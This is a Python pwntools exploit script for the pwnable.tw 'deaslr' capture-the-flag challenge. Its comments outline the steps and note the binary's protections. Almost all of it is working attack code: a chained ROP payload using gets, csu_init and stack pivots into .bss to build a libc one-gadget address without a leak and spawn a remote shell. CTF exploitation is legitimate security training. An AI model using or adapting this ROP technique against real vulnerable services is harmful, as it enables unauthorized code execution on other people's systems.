from pwn import *

local = False

if local:
	r = process("./deaslr")
	#r = remote("127.0.0.1", 4000)
	gets_off = 0x6ed80
	gadget = 0xf02a4
else:
	# nc chall.pwnable.tw 10402
	r = remote("chall.pwnable.tw", 10402)
	gets_off = 0x6ed80
	gadget = 0xef6c4

# ROPgadget
add_ebx_esi_ret = 0x400509
pop_rdi_ret = 0x4005c3
pop_rsi_r15_ret = 0x4005c1
pop_rsp_r13_r14_r15_ret = 0x4005bd
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
pop_rbp_ret = 0x4004a0
leave_ret = 0x400554
# plt
csu_init = 0x400560
gets = 0x400430

remain = (gadget - gets_off) & 0xffffffff 

rop0 = p64(pop_rbp_ret) + p64(0x601100) + p64(leave_ret) + "/bin/sh\x00"

rop1 = p64(0) + p64(csu_init) + p64(pop_rbp_ret) + p64(0x601200) + p64(leave_ret)

rop2 = p64(0) + p64(pop_rdi_ret) + p64(0x601108) + p64(gets)
rop2 += p64(pop_rdi_ret) + p64(0x6010f8) + p64(gets)
rop2 += p64(pop_rbp_ret) + p64(0x6010f0) + p64(leave_ret)

rop2x1 = p64(0)*5 + p64(pop_rsi_r15_ret) + p64(remain) + p64(0) + p64(add_ebx_esi_ret)
rop2x1 += p64(pop_rbp_ret) + p64(0x601300) + p64(leave_ret)

rop2x2 = p32(pop_rbx_rbp_r12_r13_r14_r15_ret) + "\x00\x00\x00"

rop3 = p64(0) + p64(csu_init) + p64(pop_rbp_ret) + p64(0x601400) + p64(leave_ret)

rop4 = p64(0) + p64(pop_rdi_ret) + p64(0x60110c) + p64(gets)
rop4 += p64(pop_rdi_ret) + p64(0x6010fc) + p64(gets)
rop4 += p64(pop_rbp_ret) + p64(0x6010f4) + p64(leave_ret)

rop4x1 = p64(0)*5 + p64(pop_rbp_ret) + p64(0x601500) + p64(leave_ret)

rop4x2 = p32(pop_rbx_rbp_r12_r13_r14_r15_ret) + "\x00\x00\x00"

rop5 = p64(0) + p64(pop_rdi_ret) + p64(0x6012ec) + p64(gets)
rop5 += p64(pop_rbp_ret) + p64(0x601304) + p64(leave_ret)

rop5x = p64(0)*4 + p64(csu_init) + p64(pop_rdi_ret) + p64(0x601018)
rop5x += p64(pop_rbp_ret) + p64(0x6012d8) + p64(leave_ret)

payload = p64(0)*3
payload += p64(pop_rdi_ret) + p64(0x601000) + p64(gets)
payload += p64(pop_rdi_ret) + p64(0x601100) + p64(gets)
payload += p64(pop_rdi_ret) + p64(0x601200) + p64(gets)
payload += p64(pop_rdi_ret) + p64(0x601300) + p64(gets)
payload += p64(pop_rdi_ret) + p64(0x601400) + p64(gets)
payload += p64(pop_rdi_ret) + p64(0x601500) + p64(gets)
payload += p64(pop_rsp_r13_r14_r15_ret) + p64(0x600fe8)

r.sendline(payload)
r.sendline(rop0)
r.sendline(rop1)
r.sendline(rop2)
r.sendline(rop3)
r.sendline(rop4)
r.sendline(rop5)
r.sendline(rop2x1)
r.sendline(rop2x2)
r.sendline(rop4x1)
r.sendline(rop4x2)
r.sendline(rop5x)

r.interactive()


'''
* Outline:
- Draw all the rop + it's address to see the instruction's follow
- Free to use in 0x601000 - 0x602000
- Using csu_init to push value into memory
- pop_rsp_r131415_ret
- add_ebx_esi_ret ---> control only 4 lower byte, 4 higher byte become zero
- 4 higher byte problem: push 4 lower byte and then push 4 higher byte using 
stack align 8byte: 0x..40-0x..48 ---> 0x..44-0x..4c
- gets should be in separate rop because gets function will change data in higher stack,
so it can change our important data
- system should be work :TT
'''

'''
* Protected feature:
- gets() + NO CANARY --> free to travel
- No pie: leak some important rop
- Full RELRO --> can't touch .got section
- This exploitation doesn't need to leak libc_base address
- System with /bin/sh\x00 doesn't work despite debugging is ok ---> lag ??? 
'''

"""
* Flow:
- leak libc_gets ---> r14 (pop_rsp_r131415_ret)
- push r14 into bss, pop it to rbx
- add ebx to esi to have 4 lower byte of libc_system
- push ebx to bss
- pop rbx = 4 higher byte of libc
- push it right after 4 lower byte
- now we have 8byte of libc_system and free to call
"""
